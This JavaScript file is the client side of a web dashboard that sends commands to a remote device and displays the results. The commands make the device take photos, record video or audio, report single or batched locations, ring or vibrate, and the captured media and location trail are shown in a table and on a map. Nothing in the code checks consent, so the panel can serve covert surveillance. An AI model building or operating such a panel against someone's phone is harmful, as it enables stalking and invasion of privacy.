import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';

// Initialize Supabase client
const supabaseUrl = 'https://yxdnyavcxouutwkvdoef.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZG55YXZjeG91dXR3a3Zkb2VmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcwNjE0MDQsImV4cCI6MjA2MjYzNzQwNH0.y07v2koScA07iztFr366pB5f5n5UCCzc_Agn228dujI'
const supabase = createClient(supabaseUrl, supabaseKey, {
    auth: { autoRefreshToken: true },
    realtime: { params: { eventsPerSecond: 10 } }
});
console.log('Supabase initialized');

// Pagination and filter state
let currentPage = 1;
let filesPerPage = 10;
let totalFiles = 0;
let fileTypeFilter = '';
let fileDateStart = '';
let fileDateEnd = '';
let showAllLocations = false;

// Map state
let map = null;
let markers = [];

// UI Utility Functions
function showLoginSection() {
    document.getElementById('login-section').classList.remove('d-none');
    document.getElementById('commands-section').classList.add('d-none');
    clearMessages();
    console.log('Showing login section');
}

function showCommandsSection() {
    document.getElementById('login-section').classList.add('d-none');
    document.getElementById('commands-section').classList.remove('d-none');
    clearMessages();
    console.log('Showing commands section');
}

function showLoading(buttonId, show) {
    const button = document.getElementById(buttonId);
    const spinner = button.querySelector('.spinner-border');
    const text = button.querySelector('span:first-child');
    button.disabled = show;
    spinner.classList.toggle('d-none', !show);
    text.classList.toggle('d-none', show);
    console.log(`Button ${buttonId} loading: ${show}`);
}

function showSectionLoading(sectionId, show) {
    const loading = document.getElementById(`${sectionId}-loading`);
    const error = document.getElementById(`${sectionId}-error`);
    const retry = document.getElementById(`retry-${sectionId}`);
    loading.classList.toggle('d-none', !show);
    error.classList.add('d-none');
    retry.classList.add('d-none');
    console.log(`Section ${sectionId} loading: ${show}`);
}

function showSectionError(sectionId, message) {
    const loading = document.getElementById(`${sectionId}-loading`);
    const error = document.getElementById(`${sectionId}-error`);
    const retry = document.getElementById(`retry-${sectionId}`);
    loading.classList.add('d-none');
    error.textContent = message;
    error.classList.remove('d-none');
    retry.classList.remove('d-none');
    console.log(`Section ${sectionId} error: ${message}`);
}

function clearMessages() {
    document.getElementById('error-message').textContent = '';
    document.getElementById('retry-login').classList.add('d-none');
    ['files', 'location'].forEach(section => {
        document.getElementById(`${section}-error`).textContent = '';
        document.getElementById(`retry-${section}`).classList.add('d-none');
    });
    console.log('Cleared all messages');
}

function updatePagination() {
    const totalPages = Math.ceil(totalFiles / filesPerPage);
    const pagination = document.getElementById('files-pagination');
    pagination.innerHTML = '';

    // Previous button
    const prevLi = document.createElement('li');
    prevLi.className = `page-item ${currentPage === 1 ? 'disabled' : ''}`;
    prevLi.innerHTML = `<a class="page-link" href="#" aria-label="Previous"><span aria-hidden="true">«</span></a>`;
    prevLi.addEventListener('click', (e) => {
        e.preventDefault();
        if (currentPage > 1) {
            currentPage--;
            loadFiles();
        }
    });
    pagination.appendChild(prevLi);

    // Page numbers
    for (let i = 1; i <= totalPages; i++) {
        const li = document.createElement('li');
        li.className = `page-item ${i === currentPage ? 'active' : ''}`;
        li.innerHTML = `<a class="page-link" href="#">${i}</a>`;
        li.addEventListener('click', (e) => {
            e.preventDefault();
            currentPage = i;
            loadFiles();
        });
        pagination.appendChild(li);
    }

    // Next button
    const nextLi = document.createElement('li');
    nextLi.className = `page-item ${currentPage === totalPages ? 'disabled' : ''}`;
    nextLi.innerHTML = `<a class="page-link" href="#" aria-label="Next"><span aria-hidden="true">»</span></a>`;
    nextLi.addEventListener('click', (e) => {
        e.preventDefault();
        if (currentPage < totalPages) {
            currentPage++;
            loadFiles();
        }
    });
    pagination.appendChild(nextLi);
    console.log(`Pagination updated: currentPage=${currentPage}, totalPages=${totalPages}`);
}

function initializeMap() {
    if (map) return;
    map = L.map('location-map').setView([0, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
    }).addTo(map);
    console.log('Map initialized');
}

function updateMap(locations) {
    // Clear existing markers
    markers.forEach(marker => marker.remove());
    markers = [];

    if (locations.length === 0) {
        document.getElementById('location-data').textContent = 'No location data available';
        map.setView([0, 0], 2);
        console.log('No locations available to show on map');
        return;
    }

    // Add new markers
    locations.forEach(loc => {
        const marker = L.marker([loc.latitude, loc.longitude])
            .addTo(map)
            .bindPopup(`Lat: ${loc.latitude}<br>Lon: ${loc.longitude}<br>Time: ${new Date(loc.created_at).toLocaleString()}`);
        markers.push(marker);
    });

    // Fit map to bounds or center on single location
    if (locations.length === 1) {
        map.setView([locations[0].latitude, locations[0].longitude], 13);
    } else {
        const group = L.featureGroup(markers);
        map.fitBounds(group.getBounds());
    }

    // Update text data
    const latest = locations[0];
    document.getElementById('location-data').innerHTML = `Latest: Latitude: ${latest.latitude}, Longitude: ${latest.longitude}<br>Recorded: ${new Date(latest.created_at).toLocaleString()}`;
    console.log(`${locations.length} location(s) updated on map`);
}

// Validation Functions
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

function validateCommandOptions(type, options) {
    switch (type) {
        case 'capturePhoto':
            return options.camera && ['rear', 'front'].includes(options.camera) &&
                   options.flash && ['on', 'off'].includes(options.flash);
        case 'recordVideo':
            return options.camera && ['rear', 'front'].includes(options.camera) &&
                   options.quality && ['low', 'medium', 'high'].includes(options.quality) &&
                   options.duration && [60, 120, 300].includes(Number(options.duration));
        case 'recordAudio':
            return options.duration && [60, 120, 300, 600].includes(Number(options.duration));
        case 'ring':
        case 'vibrate':
            return options.duration && Number.isInteger(Number(options.duration));
        case 'getLocation':
        case 'batchLocations':
            return true;
        default:
            return false;
    }
}

// Session Management
function saveSession(session) {
    sessionStorage.setItem('supabase_session', JSON.stringify(session));
    console.log('Session saved');
}

function getSession() {
    const session = sessionStorage.getItem('supabase_session');
    if (session) console.log('Session loaded from storage');
    return session ? JSON.parse(session) : null;
}

function clearSession() {
    sessionStorage.removeItem('supabase_session');
    console.log('Session cleared');
}

// Supabase Operations
async function login(email, password) {
    showLoading('login', true);
    try {
        if (!validateEmail(email)) throw new Error('Invalid email format');
        if (password.length < 6) throw new Error('Password must be at least 6 characters');
        const { data, error } = await supabase.auth.signInWithPassword({ email, password });
        if (error) throw new Error(error.message);
        console.log('Login successful:', data);
        saveSession(data.session);
        showCommandsSection();
        await Promise.all([loadFiles(), loadLastLocation()]);
        setupRealtimeSubscriptions();
        initializeMap();
    } catch (error) {
        console.error('Login failed:', error);
        document.getElementById('error-message').textContent = `Login failed: ${error.message}`;
        document.getElementById('retry-login').classList.remove('d-none');
    } finally {
        showLoading('login', false);
    }
}

async function sendCommand(type, options = {}) {
    showLoading(type === 'batchLocations' ? 'batchLocations' : type, true);
    try {
        const { data: user, error: userError } = await supabase.auth.getUser();
        if (userError || !user.user) throw new Error('Not authenticated');
        if (!validateCommandOptions(type, options)) throw new Error('Invalid command options');
        const command = { user_id: user.user.id, type, options };
        const { error } = await supabase.from('commands').insert(command);
        if (error) throw new Error(error.message);
        console.log(`Command sent: ${type}`, options);
        if (type === 'getLocation') await loadLastLocation();
    } catch (error) {
        console.error('Command failed:', error);
        document.getElementById('error-message').textContent = `Command failed: ${error.message}`;
    } finally {
        showLoading(type === 'batchLocations' ? 'batchLocations' : type, false);
    }
}

async function loadFiles() {
    showSectionLoading('files', true);
    try {
        const { data: user, error: userError } = await supabase.auth.getUser();
        if (userError || !user.user) throw new Error('Not authenticated');
        let query = supabase
            .from('files')
            .select('*', { count: 'exact' })
            .eq('user_id', user.user.id)
            .order('created_at', { ascending: false })
            .range((currentPage - 1) * filesPerPage, currentPage * filesPerPage - 1);

        // Apply filters
        if (fileTypeFilter) {
            query = query.eq('type', fileTypeFilter);
        }
        if (fileDateStart) {
            query = query.gte('created_at', `${fileDateStart}T00:00:00Z`);
        }
        if (fileDateEnd) {
            query = query.lte('created_at', `${fileDateEnd}T23:59:59Z`);
        }

        const { data: files, count, error } = await query;
        if (error) throw new Error(error.message);

        totalFiles = count || files.length;
        const tbody = document.getElementById('files-table');
        tbody.innerHTML = '';
        for (const file of files) {
            const { data: signedUrl } = await supabase.storage
                .from(file.bucket)
                .createSignedUrl(file.path, 60);
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${file.type}</td>
                <td>${
                    file.type === 'photo' ? `<img src="${signedUrl.signedUrl}" alt="${file.path}" class="img-fluid">` :
                    file.type === 'video' ? `<video src="${signedUrl.signedUrl}" controls class="media"></video>` :
                    `<audio src="${signedUrl.signedUrl}" controls class="media"></audio>`
                }</td>
                <td>${file.path}</td>
                <td>
                    <a href="${signedUrl.signedUrl}" download class="btn btn-sm btn-primary me-1">Download</a>
                    <button class="btn btn-sm btn-danger delete-btn" data-id="${file.id}" data-path="${file.path}" data-bucket="${file.bucket}" data-bs-toggle="modal" data-bs-target="#deleteConfirmMod[...]
                </td>
            `;
            tbody.appendChild(row);
        }
        updatePagination();
        console.log(`Files loaded: ${files.length}, totalFiles: ${totalFiles}`);
    } catch (error) {
        console.error('Load files failed:', error);
        showSectionError('files', `Load files failed: ${error.message}`);
    } finally {
        showSectionLoading('files', false);
    }
}

async function deleteFile(id, path, bucket) {
    try {
        const { error: storageError } = await supabase.storage
            .from(bucket)
            .remove([path]);
        if (storageError) throw new Error(storageError.message);
        const { error: dbError } = await supabase
            .from('files')
            .delete()
            .eq('id', id);
        if (dbError) throw new Error(dbError.message);
        console.log(`File deleted: ${path}`);
        await loadFiles();
        document.getElementById('files-error').classList.remove('text-danger');
        document.getElementById('files-error').classList.add('text-success');
        document.getElementById('files-error').textContent = 'File deleted successfully';
        setTimeout(() => {
            document.getElementById('files-error').textContent = '';
            document.getElementById('files-error').classList.remove('text-success');
            document.getElementById('files-error').classList.add('text-danger');
        }, 3000);
    } catch (error) {
        console.error('Delete file failed:', error);
        document.getElementById('error-message').textContent = `Delete file failed: ${error.message}`;
    }
}

async function loadLastLocation() {
    showSectionLoading('location', true);
    try {
        const { data: user, error: userError } = await supabase.auth.getUser();
        if (userError || !user.user) throw new Error('Not authenticated');
        let query = supabase
            .from('locations')
            .select('latitude, longitude, created_at')
            .eq('user_id', user.user.id)
            .order('created_at', { ascending: false });

        if (!showAllLocations) {
            query = query.limit(1);
        }

        const { data: locations, error } = await query;
        if (error) throw new Error(error.message);
        updateMap(locations);
        console.log(`Locations loaded: ${locations.length}`);
    } catch (error) {
        console.error('Load location failed:', error);
        showSectionError('location', `Load location failed: ${error.message}`);
    } finally {
        showSectionLoading('location', false);
    }
}

function setupRealtimeSubscriptions() {
    const userId = supabase.auth.getUser().then(({ data: { user } }) => user?.id).catch(() => null);

    // Files subscription
    const filesChannel = supabase.channel('files-channel');
    filesChannel
        .on('postgres_changes', {
            event: '*',
            schema: 'public',
            table: 'files',
            filter: `user_id=eq.${userId}`
        }, () => {
            console.log('Files table changed, reloading files');
            loadFiles();
        })
        .subscribe((status) => console.log('Files channel status:', status));

    // Locations subscription
    const locationsChannel = supabase.channel('locations-channel');
    locationsChannel
        .on('postgres_changes', {
            event: 'INSERT',
            schema: 'public',
            table: 'locations',
            filter: `user_id=eq.${userId}`
        }, () => {
            console.log('New location added, reloading location');
            loadLastLocation();
        })
        .subscribe((status) => console.log('Locations channel status:', status));
    console.log('Realtime subscriptions set up');
}

// Event Listeners
document.getElementById('login-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    console.log('Login form submitted');
    await login(email, password);
});

document.getElementById('retry-login').addEventListener('click', async () => {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    console.log('Retry login clicked');
    await login(email, password);
});

document.getElementById('logout').addEventListener('click', async () => {
    showLoading('logout', true);
    try {
        await supabase.auth.signOut();
        supabase.channel('files-channel').unsubscribe();
        supabase.channel('locations-channel').unsubscribe();
        clearSession();
        showLoginSection();
        document.getElementById('error-message').textContent = 'Logged out successfully';
        console.log('User logged out');
    } catch (error) {
        console.error('Logout failed:', error);
        document.getElementById('error-message').textContent = `Logout failed: ${error.message}`;
    } finally {
        showLoading('logout', false);
    }
});

document.getElementById('capturePhoto').addEventListener('click', async () => {
    const camera = document.getElementById('photo-camera').value;
    const flash = document.getElementById('photo-flash').value;
    console.log('Capture photo command issued');
    await sendCommand('capturePhoto', { camera, flash });
});

document.getElementById('recordVideo').addEventListener('click', async () => {
    const camera = document.getElementById('video-camera').value;
    const quality = document.getElementById('video-quality').value;
    const duration = parseInt(document.getElementById('video-duration').value);
    console.log('Record video command issued');
    await sendCommand('recordVideo', { camera, quality, duration });
});

document.getElementById('recordAudio').addEventListener('click', async () => {
    const duration = parseInt(document.getElementById('audio-duration').value);
    console.log('Record audio command issued');
    await sendCommand('recordAudio', { duration });
});

document.getElementById('getLocation').addEventListener('click', async () => {
    console.log('Get location command issued');
    await sendCommand('getLocation');
});

document.getElementById('batchLocations').addEventListener('click', async () => {
    console.log('Batch locations command issued');
    await sendCommand('batchLocations');
});

document.getElementById('ring').addEventListener('click', async () => {
    console.log('Ring command issued');
    await sendCommand('ring', { duration: 5 });
});

document.getElementById('vibrate').addEventListener('click', async () => {
    console.log('Vibrate command issued');
    await sendCommand('vibrate', { duration: 1 });
});

document.getElementById('retry-files').addEventListener('click', () => {
    console.log('Retry files load');
    loadFiles();
});
document.getElementById('retry-location').addEventListener('click', () => {
    console.log('Retry location load');
    loadLastLocation();
});

document.getElementById('files-per-page').addEventListener('change', (e) => {
    filesPerPage = parseInt(e.target.value);
    currentPage = 1;
    console.log(`Files per page changed: ${filesPerPage}`);
    loadFiles();
});

document.getElementById('file-type-filter').addEventListener('change', (e) => {
    fileTypeFilter = e.target.value;
    currentPage = 1;
    console.log(`File type filter changed: ${fileTypeFilter}`);
    loadFiles();
});

document.getElementById('file-date-start').addEventListener('change', (e) => {
    fileDateStart = e.target.value;
    currentPage = 1;
    console.log(`File date start filter changed: ${fileDateStart}`);
    loadFiles();
});

document.getElementById('file-date-end').addEventListener('change', (e) => {
    fileDateEnd = e.target.value;
    currentPage = 1;
    console.log(`File date end filter changed: ${fileDateEnd}`);
    loadFiles();
});

document.getElementById('toggle-location-view').addEventListener('click', () => {
    showAllLocations = !showAllLocations;
    document.getElementById('toggle-location-view').textContent = showAllLocations ? 'Show Latest Location' : 'Show All Locations';
    console.log(`Location view toggled: showAllLocations=${showAllLocations}`);
    loadLastLocation();
});

// Delete Confirmation
let pendingDelete = null;
document.addEventListener('click', (e) => {
    if (e.target.classList.contains('delete-btn')) {
        pendingDelete = {
            id: e.target.dataset.id,
            path: e.target.dataset.path,
            bucket: e.target.dataset.bucket
        };
        console.log('Delete file button clicked', pendingDelete);
    }
});

document.getElementById('confirmDelete').addEventListener('click', async () => {
    if (pendingDelete) {
        console.log('Confirm delete file', pendingDelete);
        await deleteFile(pendingDelete.id, pendingDelete.path, pendingDelete.bucket);
        pendingDelete = null;
        const modal = bootstrap.Modal.getInstance(document.getElementById('deleteConfirmModal'));
        modal.hide();
    }
});

// The login button is ALWAYS enabled (no validation disables it)
document.getElementById('login').disabled = false;

// Check for existing session
supabase.auth.getSession().then(({ data: { session } }) => {
    if (session || getSession()) {
        console.log('Existing session found, loading dashboard');
        showCommandsSection();
        loadFiles();
        loadLastLocation();
        setupRealtimeSubscriptions();
        initializeMap();
    } else {
        console.log('No session found, showing login');
    }
});
